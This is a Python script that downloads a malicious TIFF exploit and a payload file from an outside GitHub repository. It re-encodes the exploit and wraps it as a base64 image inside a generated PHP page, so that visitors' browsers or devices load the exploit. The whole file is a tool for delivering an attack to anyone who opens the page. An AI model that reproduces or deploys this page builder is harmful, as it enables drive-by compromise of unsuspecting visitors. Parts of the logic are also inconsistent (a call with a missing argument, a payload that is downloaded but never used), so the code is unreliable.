import base64 #Used to append the image to the php file
import pickle #Used to create storage files that store hex data
import os #Used for File deleting and if exists functions and renaming files and even exit codes
import binascii #Used to read back hex data and append hex data
import urllib3 #Used to download the payload.bin file and the exploit.bin file
import pathlib #Used to obtain the current path
import random #Used to generate chunk sizes
def check(num):
  num2 = int(num)
  if (num2 % 2) == 0:
    print("{0} is Even".format(num2))
    data = "even"
    return data
  else:
    print("{0} is Odd".format(num2))
    data = "odd"
    return data
def exploit(offset, secondary):
  if offset == 0:
    if secondary == 1: #No Pre-Existing Mode
      pre(0)
      task(2)
    elif secondary == 2: #With Pre-Existing Mode
      pre(1)
      task(2)
    elif secondary == 3: #Download Hex Template Mode
      pre(1)
      os._exit(0)
    elif secondary == 4: #Re-generate Credits File mode
      credits(0)
  elif offset == 1:
    # Open in binary mode (so you don't read two byte line endings on Windows as one byte)
    # and use with statement (always do this to avoid leaked file descriptors, unflushed files)
    with open('exploit.tiff', 'rb') as f:
        # Slurp the whole file and efficiently convert it to hex all at once
        hexdata = binascii.hexlify(f.read())
        pickle.dump((hexdata.decode('utf-8')), open('hex.dat', 'wb'))
  elif offset == 2:
    data2 = str(pathlib.Path(__file__).parent.absolute()) + "/" + "exploit.tiff"
    url2 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/exploit.tiff"
    downloadtask(data2, url2)
  elif offset == 3:
    data1 = str(pathlib.Path(__file__).parent.absolute()) + "/" + "payload.bin"
    url1 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/payload.bin"
    downloadtask(data1, url1)
  elif offset == 4:
    credits(1)
  elif offset == 5:
    if os.path.exists("payload.bin"):
      os.remove("payload.bin")
  elif offset == 6:
    if os.path.exists("hex.dat"):
      os.remove("hex.dat")
  elif offset == 7:
    if os.path.exists("exploit.tiff"):
      os.remove("exploit.tiff")
  elif offset == 8:
    if os.path.exists("exploit.bin"):
      os.remove("exploit.bin")
  elif offset == 9:
    if os.path.exists("exploit.php"):
      os.remove("exploit.php")
  else:
    exploit(0)
def run():
  load_file = open('hex.dat', 'rb')
  f = pickle.load(load_file)
  with open('exploit.bin', 'wb') as fout:
    fout.write(
      binascii.unhexlify(f)
    )
  exploit(6, 0)
  data = open('exploit.bin', 'rb').read()
  bytes_base64 = base64.b64encode(data)
  text_base64 = bytes_base64.decode()
  html = '<?php\n$htmlcode = "<img src=\\"data:image/png;base64,' + text_base64 + '\\">";\necho $htmlcode\n?>'
  open('exploit.php', 'w').write(html)
  exploit(7, 0)
  exploit(8, 0)
  return html
def pre(mainoffset):
  if mainoffset == 0:
    task(1)
    task(0)
    data = int(0)
    return data
  elif mainoffset == 1:
    task(1)
    data = int(0)
    return data
  elif mainoffset == 2:
    exploit(5, 0)
    task(0)
    data = "MSG:" + " " + str(pathlib.Path(__file__).parent.absolute()) + " " + "DOWNLOADED!"
    return data
def credits(othroffset):
    a = "credits:\n"
    b = a + "base64 implmentation by fmw42\n"
    c = b + "hex implementation by falsetru\n"
    d = c + "file to hex implementation by ShadowRanger\n"
    e = d + "urllib3 downloading implementation by shazrow\n"
    f = e + "exploit.bin based on exploit.tiff by planetbeing\n"
    if othroffset == 0:
      h = open("CREDITS.txt", "a")
      h.write(f)
      h.close()
    elif othroffset == 1:
      print(f)
def task(miscoffset):
  if miscoffset == 0:
    exploit(2, 0)
    exploit(1, 0)
  elif miscoffset == 1:
    exploit(5, 0)
    exploit(4, 0)
    exploit(3, 0)
  elif miscoffset == 2:
    run()
    os._exit(0)
def downloadtask(data, url):
  http = urllib3.PoolManager()
  r = http.request('GET', url, preload_content=False)
  chunk_size = random.randint(10, 1000)
  with open(data, 'wb') as out:
    while True:
      data = r.read(chunk_size)
      if not data:
        break
      out.write(data)
  r.release_conn()
